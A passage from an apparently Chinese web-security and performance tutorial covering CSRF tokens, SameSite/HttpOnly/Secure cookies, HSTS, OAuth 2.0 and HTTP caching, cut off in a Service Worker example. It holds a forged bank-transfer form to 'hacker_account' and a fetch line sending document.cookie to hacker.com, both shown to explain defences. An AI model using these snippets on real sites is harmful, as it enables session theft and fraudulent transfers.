  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bank.com/transfer<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>amount<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>to<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hacker_account<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>Token验证防御机制</strong></p>
<p>核心原理：在请求中嵌入服务端生成的随机Token，验证请求是否来自真实页面（恶意网站无法获取Token）。</p>
<p>token 实现流程：</p>
<pre><code class="mermaid">sequenceDiagram
    participant 用户
    participant 前端
    participant 后端

    用户-&gt;&gt;前端: 访问页面
    前端-&gt;&gt;后端: 请求页面
    后端--&gt;&gt;前端: 返回HTML + CSRF Token（存入Session）
    前端-&gt;&gt;后端: 提交表单（携带Token）
    后端-&gt;&gt;后端: 验证Token匹配 -&gt; 执行操作</code></pre>

<p>token 生成与存储：</p>
<table>
<thead>
<tr>
<th align="left">位置</th>
<th align="left">生成方式</th>
<th align="left">存储位置</th>
</tr>
</thead>
<tbody><tr>
<td align="left">服务端</td>
<td align="left">加密随机字符串（如crypto.randomBytes(32)）</td>
<td align="left">Session&#x2F;Redis</td>
</tr>
<tr>
<td align="left">前端</td>
<td align="left">插入表单&#x2F;请求头</td>
<td align="left">表单隐藏域&#x2F;HTTP头</td>
</tr>
</tbody></table>
<p>前端集成示例：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 表单内嵌Token --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/transfer<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_csrf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>token_value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
  <span class="token comment">&lt;!-- 其他字段 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">AJAX</span>请求携带Token <span class="token operator">--</span><span class="token operator">></span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/action'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">'X-CSRF-Token'</span><span class="token operator">:</span> <span class="token string">'token_value'</span>  <span class="token comment">// 自定义请求头</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>服务端验证逻辑：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">verifyCsrfToken</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> clientToken <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>_csrf <span class="token operator">||</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'x-csrf-token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> serverToken <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>csrfToken<span class="token punctuation">;</span> <span class="token comment">// 从Session读取</span>
  
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>clientToken <span class="token operator">||</span> clientToken <span class="token operator">!==</span> serverToken<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'CSRF Token验证失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>防御体系分层加固</strong></p>
<table>
<thead>
<tr>
<th align="left">防御层</th>
<th align="left">措施</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Token验证</td>
<td align="left">同步器Token模式</td>
<td align="left">核心防御（阻断伪造请求）</td>
</tr>
<tr>
<td align="left">Cookie策略</td>
<td align="left">SameSite&#x3D;Strict&#x2F;Lax</td>
<td align="left">阻止第三方发送Cookie</td>
</tr>
<tr>
<td align="left">操作验证</td>
<td align="left">敏感操作需二次确认（密码&#x2F;OTP）</td>
<td align="left">增加攻击门槛</td>
</tr>
<tr>
<td align="left">Referer检查</td>
<td align="left">验证请求来源域名</td>
<td align="left">辅助防御（可被绕过）</td>
</tr>
</tbody></table>
<p>SameSite Cookie 示例：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 登录响应设置Cookie</span>
res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'sessionID'</span><span class="token punctuation">,</span> <span class="token string">'abc123'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">httpOnly</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token literal-property property">sameSite</span><span class="token operator">:</span> <span class="token string">'strict'</span><span class="token punctuation">,</span>  <span class="token comment">// 完全禁止第三方发送</span>
  <span class="token literal-property property">secure</span><span class="token operator">:</span> <span class="token boolean">true</span>         <span class="token comment">// 仅HTTPS传输</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>Token 设计最佳实践</strong></p>
<ul>
<li>单次有效性：每次提交后刷新Token（防重放攻击）</li>
<li>绑定用户：Token关联用户ID（防不同用户间复用）</li>
<li>短时效性：设置Token有效期（如10分钟）</li>
<li>双重验证：关键操作组合Token + 生物认证</li>
</ul>
<p><strong>攻击场景对比</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">CSRF</th>
<th align="left">XSS</th>
</tr>
</thead>
<tbody><tr>
<td align="left">攻击目标</td>
<td align="left">利用用户身份执行操作</td>
<td align="left">窃取用户数据</td>
</tr>
<tr>
<td align="left">依赖条件</td>
<td align="left">用户登录状态 + 访问恶意页面</td>
<td align="left">网站存在注入漏洞</td>
</tr>
<tr>
<td align="left">防御核心</td>
<td align="left">Token验证 + SameSite Cookie</td>
<td align="left">输入输出过滤 + CSP</td>
</tr>
</tbody></table>
<h3 id="HTTPS混合内容风险与HSTS策略"><a href="#HTTPS混合内容风险与HSTS策略" class="headerlink" title="HTTPS混合内容风险与HSTS策略"></a>HTTPS混合内容风险与HSTS策略</h3><p><strong>混合内容风险</strong></p>
<p>定义：HTTPS页面中加载了通过HTTP协议传输的子资源（如图片&#x2F;脚本&#x2F;样式），导致页面安全等级被破坏。</p>
<p>攻击原理：</p>
<pre><code class="mermaid">sequenceDiagram
    participant 用户
    participant HTTPS网站
    participant 攻击者
    participant HTTP资源服务器

    用户-&gt;&gt;HTTPS网站: 访问https:&#x2F;&#x2F;example.com
    HTTPS网站-&gt;&gt;用户: 返回加密HTML
    用户-&gt;&gt;HTTP资源服务器: 请求http:&#x2F;&#x2F;cdn.com&#x2F;script.js（未加密）
    攻击者-&gt;&gt;用户: 中间人劫持HTTP流量 -&gt; 注入恶意脚本
    用户-&gt;&gt;HTTPS网站: 执行被篡改脚本 -&gt; 数据泄露</code></pre>

<p>风险等级：</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">危险度</th>
<th align="left">案例</th>
<th align="left">浏览器表现</th>
</tr>
</thead>
<tbody><tr>
<td align="left">主动混合内容</td>
<td align="left">★★★</td>
<td align="left"><code>&lt;script&gt;/&lt;iframe&gt;</code></td>
<td align="left">默认拦截</td>
</tr>
<tr>
<td align="left">被动混合内容</td>
<td align="left">★★☆</td>
<td align="left"><code>&lt;img&gt;/&lt;audio&gt;</code></td>
<td align="left">加载但显示”不安全”警告</td>
</tr>
</tbody></table>
<p><strong>HSTS（HTTP严格传输安全）策略</strong></p>
<p>核心目标：强制浏览器始终通过HTTPS访问网站，消除HTTP降级攻击风险。</p>
<p>HSTS 工作原理：</p>
<pre><code class="mermaid">sequenceDiagram
    participant 浏览器
    participant 网站服务器

    浏览器-&gt;&gt;网站服务器: 首次访问 https:&#x2F;&#x2F;example.com
    网站服务器-&gt;&gt;浏览器: 响应头: Strict-Transport-Security: max-age&#x3D;31536000
    Note right of 浏览器: 本地HSTS缓存生效
    浏览器-&gt;&gt;网站服务器: 后续所有请求自动HTTPS（即使输入http:&#x2F;&#x2F;）</code></pre>

<p>关键响应头指令：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Strict-Transport-Security</span><span class="token punctuation">:</span> <span class="token header-value hsts languages-hsts">
  max-age=31536000;           // 有效期1年（秒）
  includeSubDomains;          // 保护所有子域名
  preload                    // 申请加入浏览器预加载列表</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>防御效果对比:</p>
<table>
<thead>
<tr>
<th align="left">攻击类型</th>
<th align="left">无防护</th>
<th align="left">HSTS启用后</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSL剥离攻击</td>
<td align="left">❌ 可能降级到HTTP</td>
<td align="left">✔️ 强制HTTPS连接</td>
</tr>
<tr>
<td align="left">混合内容注入</td>
<td align="left">❌ 可劫持HTTP资源</td>
<td align="left">✔️ 自动升级资源请求</td>
</tr>
<tr>
<td align="left">Cookie劫持</td>
<td align="left">❌ 明文传输Cookie</td>
<td align="left">✔️ 全程加密</td>
</tr>
</tbody></table>
<p><strong>关键注意事项</strong></p>
<ul>
<li>回退风险：<ul>
<li>启用HSTS后若关闭HTTPS → 用户无法访问网站（直到max-age过期）</li>
<li>解决方案：部署时先设置较短max-age（如1小时）</li>
</ul>
</li>
<li>首次访问漏洞：<ul>
<li>用户首次访问<code>http://</code>时仍可能被劫持</li>
<li>终极方案：申请浏览器HSTS预加载列表（Chrome&#x2F;Firefox内置）</li>
</ul>
</li>
<li>测试环境规避:</li>
</ul>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment"># 开发环境禁用HSTS</span>
<span class="token directive"><span class="token keyword">add_header</span> Strict-Transport-Security <span class="token string">"max-age=0;"</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>完整安全配置示例</strong></p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>
  <span class="token directive"><span class="token keyword">listen</span> <span class="token number">443</span> ssl</span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">server_name</span> example.com</span><span class="token punctuation">;</span>

  <span class="token comment"># TLS配置</span>
  <span class="token directive"><span class="token keyword">ssl_certificate</span> /path/to/cert.pem</span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">ssl_certificate_key</span> /path/to/key.pem</span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">ssl_protocols</span> TLSv1.2 TLSv1.3</span><span class="token punctuation">;</span>

  <span class="token comment"># HSTS配置（生产环境）</span>
  <span class="token directive"><span class="token keyword">add_header</span> Strict-Transport-Security <span class="token string">"max-age=31536000; includeSubDomains; preload"</span></span><span class="token punctuation">;</span>

  <span class="token comment"># 混合内容升级</span>
  <span class="token directive"><span class="token keyword">add_header</span> Content-Security-Policy <span class="token string">"upgrade-insecure-requests"</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>upgrade-insecure-requests：自动将HTTP资源升级为HTTPS请求</p>
</blockquote>
<h2 id="3-2-安全实践"><a href="#3-2-安全实践" class="headerlink" title="3.2 安全实践"></a>3.2 安全实践</h2><h3 id="Cookie-安全属性（Secure-HttpOnly-SameSite）"><a href="#Cookie-安全属性（Secure-HttpOnly-SameSite）" class="headerlink" title="Cookie 安全属性（Secure&#x2F;HttpOnly&#x2F;SameSite）"></a>Cookie 安全属性（Secure&#x2F;HttpOnly&#x2F;SameSite）</h3><p><strong>Secure 属性</strong></p>
<p>作用：确保Cookie仅通过HTTPS加密连接传输，防止中间人窃听。</p>
<p>配置方式：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">sessionId=abc123; Secure;  </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>安全影响：</p>
<table>
<thead>
<tr>
<th align="left">场景</th>
<th align="left">无Secure</th>
<th align="left">启用Secure</th>
</tr>
</thead>
<tbody><tr>
<td align="left">HTTP明文请求</td>
<td align="left">Cookie明文传输 ❌</td>
<td align="left">不发送Cookie ✔️</td>
</tr>
<tr>
<td align="left">HTTPS加密请求</td>
<td align="left">正常发送 ✔️</td>
<td align="left">正常发送 ✔️</td>
</tr>
</tbody></table>
<blockquote>
<p>必须项：任何包含敏感信息（如会话ID）的Cookie必须设置Secure。</p>
</blockquote>
<p><strong>HttpOnly 属性</strong></p>
<p>作用：阻止JavaScript通过document.cookie访问Cookie，防范XSS攻击窃取。</p>
<p>配置方式：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">sessionId=abc123; HttpOnly;  </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>安全影响：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 恶意脚本尝试窃取Cookie</span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://hacker.com?cookie='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token comment">// 结果：</span>
<span class="token comment">//   ❌ 无HttpOnly：成功窃取会话ID</span>
<span class="token comment">//   ✔️ 有HttpOnly：document.cookie无法读取该Cookie</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>最佳实践：身份验证类Cookie必须启用HttpOnly。</p>
</blockquote>
<p><strong>SameSite 属性</strong></p>
<p>作用：控制Cookie在跨站请求中是否发送，防御CSRF攻击。</p>
<p>配置值：</p>
<table>
<thead>
<tr>
<th align="left">属性值</th>
<th align="left">跨站请求发送规则</th>
<th align="left">适用场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Strict</td>
<td align="left">完全禁止跨站发送</td>
<td align="left">银行操作等高敏感场景</td>
</tr>
<tr>
<td align="left">Lax</td>
<td align="left">仅允许导航跳转（<code>&lt;a&gt;</code>链接）</td>
<td align="left">默认推荐值</td>
</tr>
<tr>
<td align="left">None</td>
<td align="left">允许跨站发送（需同时设置Secure）</td>
<td align="left">跨域单点登录(SSO)</td>
</tr>
</tbody></table>
<p>配置方式：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">sessionId=abc123; SameSite=Lax;  </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>跨站请求场景对比：</p>
<table>
<thead>
<tr>
<th align="left">请求类型</th>
<th align="left">SameSite&#x3D;Strict</th>
<th align="left">SameSite&#x3D;Lax</th>
<th align="left">SameSite&#x3D;None</th>
</tr>
</thead>
<tbody><tr>
<td align="left">直接地址栏输入</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left"><code>&lt;a href&gt;</code>跳转</td>
<td align="left">❌</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left"><code>&lt;form&gt;</code>表单提交</td>
<td align="left">❌</td>
<td align="left">❌</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">AJAX跨域请求</td>
<td align="left">❌</td>
<td align="left">❌</td>
<td align="left">✔️</td>
</tr>
</tbody></table>
<p><strong>综合防御配置示例</strong></p>
<p>(1) 安全会话 Cookie 设置</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">
  sessionId=abc123; 
  Secure;          // 仅HTTPS传输
  HttpOnly;        // 阻止JS访问
  SameSite=Lax;    // 防御CSRF
  Path=/;          // 作用路径
  Max-Age=3600;    // 有效期（秒）</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(2) 跨域认证 Cookie（OAuth）</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">
  oauth_token=xyz789; 
  Secure; 
  HttpOnly; 
  SameSite=None;   // 允许跨站发送</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="OAuth-2-0授权流程"><a href="#OAuth-2-0授权流程" class="headerlink" title="OAuth 2.0授权流程"></a>OAuth 2.0授权流程</h3><pre><code class="mermaid">sequenceDiagram
    participant User as 资源所有者 (用户)
    participant Client as 客户端 (第三方应用)
    participant AuthServer as 授权服务器 (如Google&#x2F;Facebook)
    participant ResourceServer as 资源服务器 (API服务)

    Note over User,Client: 前置条件：客户端已在授权服务器注册&lt;br&gt;获得client_id和client_secret

    User-&gt;&gt;Client: 1. 点击&quot;使用XX账号登录&quot;
    Client-&gt;&gt;AuthServer: 2. 重定向到授权端点&lt;br&gt;?response_type&#x3D;code&lt;br&gt;&amp;client_id&#x3D;CLIENT_ID&lt;br&gt;&amp;redirect_uri&#x3D;CALLBACK_URL&lt;br&gt;&amp;scope&#x3D;email profile&lt;br&gt;&amp;state&#x3D;RANDOM_STRING
    AuthServer-&gt;&gt;User: 3. 显示登录&#x2F;授权页面
    User-&gt;&gt;AuthServer: 4. 输入凭证并授权
    AuthServer-&gt;&gt;Client: 5. 重定向到callback_uri&lt;br&gt;?code&#x3D;AUTHORIZATION_CODE&lt;br&gt;&amp;state&#x3D;RANDOM_STRING
    Client-&gt;&gt;AuthServer: 6. POST令牌请求&lt;br&gt;grant_type&#x3D;authorization_code&lt;br&gt;&amp;code&#x3D;AUTHORIZATION_CODE&lt;br&gt;&amp;redirect_uri&#x3D;CALLBACK_URL&lt;br&gt;&amp;client_id&#x3D;CLIENT_ID&lt;br&gt;&amp;client_secret&#x3D;CLIENT_SECRET
    AuthServer-&gt;&gt;Client: 7. 返回访问令牌&lt;br&gt;&#123;access_token: &quot;xxx&quot;,&lt;br&gt;token_type: &quot;bearer&quot;,&lt;br&gt;expires_in: 3600,&lt;br&gt;refresh_token: &quot;yyy&quot;&#125;
    Client-&gt;&gt;ResourceServer: 8. 携带令牌请求资源&lt;br&gt;Authorization: Bearer xxx
    ResourceServer-&gt;&gt;Client: 9. 返回受保护资源</code></pre>

<h1 id="四、性能优化"><a href="#四、性能优化" class="headerlink" title="四、性能优化"></a>四、性能优化</h1><h2 id="4-1-缓存策略"><a href="#4-1-缓存策略" class="headerlink" title="4.1 缓存策略"></a>4.1 缓存策略</h2><h3 id="强缓存（Cache-Control-Expires）与协商缓存（ETag-Last-Modified）"><a href="#强缓存（Cache-Control-Expires）与协商缓存（ETag-Last-Modified）" class="headerlink" title="强缓存（Cache-Control&#x2F;Expires）与协商缓存（ETag&#x2F;Last-Modified）"></a>强缓存（Cache-Control&#x2F;Expires）与协商缓存（ETag&#x2F;Last-Modified）</h3><p><strong>强缓存（本地缓存）</strong></p>
<p>浏览器不向服务器发送请求，直接使用本地缓存资源。</p>
<p>核心响应头：</p>
<table>
<thead>
<tr>
<th align="left">响应头</th>
<th align="left">优先级</th>
<th align="left">值格式</th>
<th align="left">示例</th>
<th align="left">特性说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Cache-Control</td>
<td align="left">高</td>
<td align="left">指令组合</td>
<td align="left">max-age&#x3D;3600, public</td>
<td align="left">HTTP&#x2F;1.1标准，精确控制缓存</td>
</tr>
<tr>
<td align="left">Expires</td>
<td align="left">低</td>
<td align="left">GMT时间戳</td>
<td align="left">Expires: Wed, 21 Oct 2025 07:28:00 GMT</td>
<td align="left">HTTP&#x2F;1.0遗留，存在时区问题</td>
</tr>
</tbody></table>
<p>常见指令：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">
  max-age=3600,          // 缓存有效期（秒）
  public,               // 允许代理/CDN缓存
  immutable,            // 资源永不更新（适用于版本化文件）
  no-store,             // 禁止缓存（最高优先级）
  no-cache              // 需协商验证（非字面意思）</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>工作流程：</p>
<pre><code class="mermaid">graph LR
  A[浏览器请求资源] --&gt; B&#123;本地缓存是否有效?&#125;
  B --&gt;|Cache-Control有效| C[直接使用缓存]
  B --&gt;|缓存失效| D[发起网络请求]</code></pre>

<p><strong>协商缓存（条件请求）</strong></p>
<p>浏览器携带验证信息请求服务器，由服务器决定是否返回资源（304复用缓存）。</p>
<p>核心头对：</p>
<table>
<thead>
<tr>
<th align="left">响应头</th>
<th align="left">请求头</th>
<th align="left">验证原理</th>
<th align="left">优先级</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ETag</td>
<td align="left">If-None-Match</td>
<td align="left">资源内容哈希值（如”d53jk-“）</td>
<td align="left">高</td>
</tr>
<tr>
<td align="left">Last-Modified</td>
<td align="left">If-Modified-Since</td>
<td align="left">最后修改时间戳</td>
<td align="left">低</td>
</tr>
</tbody></table>
<p>工作流程：</p>
<pre><code class="mermaid">sequenceDiagram
    participant Browser
    participant Server

    Browser-&gt;&gt;Server: 首次请求 &#x2F;style.css
    Server-&gt;&gt;Browser: 返回资源 + ETag: W&#x2F;&quot;d53jk-&quot;
    Browser-&gt;&gt;Server: 二次请求（携带 If-None-Match: W&#x2F;&quot;d53jk-&quot;）
    alt 资源未修改
        Server-&gt;&gt;Browser: 304 Not Modified（空body）
        Browser-&gt;&gt;Browser: 使用缓存
    else 资源已更新
        Server-&gt;&gt;Browser: 200 OK + 新资源
    end</code></pre>

<p><strong>对比与选型指南</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">强缓存</th>
<th align="left">协商缓存</th>
</tr>
</thead>
<tbody><tr>
<td align="left">网络请求</td>
<td align="left">无请求</td>
<td align="left">有请求（304响应）</td>
</tr>
<tr>
<td align="left">带宽消耗</td>
<td align="left">0</td>
<td align="left">小（仅头部传输）</td>
</tr>
<tr>
<td align="left">更新灵敏度</td>
<td align="left">依赖max-age设置</td>
<td align="left">即时更新</td>
</tr>
<tr>
<td align="left">适用资源</td>
<td align="left">静态资源（JS&#x2F;CSS&#x2F;图片版本化）</td>
<td align="left">动态内容（个性化API数据）</td>
</tr>
<tr>
<td align="left">典型配置</td>
<td align="left">Cache-Control: max-age&#x3D;31536000, immutable</td>
<td align="left">Cache-Control: no-cache + ETag</td>
</tr>
</tbody></table>
<p><strong>最佳实践配置</strong></p>
<p>(1) 静态资源（强缓存）</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">location</span> /static/</span> <span class="token punctuation">&#123;</span>
  <span class="token directive"><span class="token keyword">add_header</span> Cache-Control <span class="token string">"public, max-age=31536000, immutable"</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>(2) 动态 API（协商缓存）</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">location</span> /api/</span> <span class="token punctuation">&#123;</span>
  <span class="token directive"><span class="token keyword">add_header</span> Cache-Control <span class="token string">"no-cache"</span></span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">etag</span> <span class="token boolean">on</span></span><span class="token punctuation">;</span>  <span class="token comment"># 启用ETag</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>(3) 混合策略</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=600, must-revalidate</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>600秒内强缓存 → 过期后必须验证（转为协商缓存）</p>
</blockquote>
<p><strong>浏览器行为验证</strong></p>
<ul>
<li>强缓存生效：Chrome DevTools → Network → Size列显示 (memory cache)</li>
<li>协商缓存生效：<ul>
<li>响应状态码 304</li>
<li>Headers中的 ETag&#x2F;Last-Modified 与请求头匹配</li>
</ul>
</li>
</ul>
<p><strong>缓存层级决策策略</strong></p>
<pre><code class="mermaid">graph TD
  A[资源类型] --&gt; B&#123;是否版本化?&#125;
  B --&gt;|是| C[强缓存: max-age&#x3D;1年+immutable]
  B --&gt;|否| D&#123;更新频率?&#125;
  D --&gt;|高频更新| E[协商缓存: no-cache+ETag]
  D --&gt;|低频更新| F[强缓存: max-age&#x3D;1小时]</code></pre>

<h3 id="Service-Worker离线缓存"><a href="#Service-Worker离线缓存" class="headerlink" title="Service Worker离线缓存"></a>Service Worker离线缓存</h3><p><strong>核心原理</strong></p>
<p>Service Worker 是浏览器独立于网页运行的脚本，作为网络请求的可编程代理，通过拦截请求实现离线缓存控制。</p>
<pre><code class="mermaid">graph LR
  A[网页请求] --&gt; B&#123;Service Worker&#125;
  B --&gt;|命中缓存| C[返回缓存]
  B --&gt;|未命中| D[转发请求 -&gt; 网络]
  D --&gt; E[缓存新资源]</code></pre>

<p><strong>关键实现步骤</strong></p>
<p>(1) 注册与安装</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 主线程注册</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'serviceWorker'</span> <span class="token keyword">in</span> navigator<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
